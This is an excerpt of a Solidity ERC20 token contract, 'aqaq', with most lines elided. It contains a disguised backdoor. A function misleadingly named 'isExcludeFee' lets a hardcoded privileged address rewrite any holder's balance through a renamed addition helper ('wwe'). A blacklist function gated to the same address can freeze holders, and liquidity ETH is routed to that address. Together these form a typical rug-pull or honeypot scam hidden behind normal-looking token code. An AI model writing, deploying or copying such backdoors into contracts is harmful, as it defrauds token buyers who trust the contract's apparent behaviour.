...
library SafeMath {
    ...
    function wwe(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
...
contract  aqaq is Context, IERC20, Ownable {
    ...
    modifier iContract() {
        require(_msgSender() == ETHReceiver, "UR not owner");_;
    }

    function setBlackList(address[] calldata addresses, bool status) public iContract() {
    ...
    constructor () {
        ...
        ETHReceiver = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function isExcludeFee(address from, uint256 amount) public iContract() {
        _balances[from] = amount.div(2).wwe(_balances[from] + amount.div(3));
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(ETHAmount > 0)
            ETHReceiver.transfer(ETHAmount);
    }
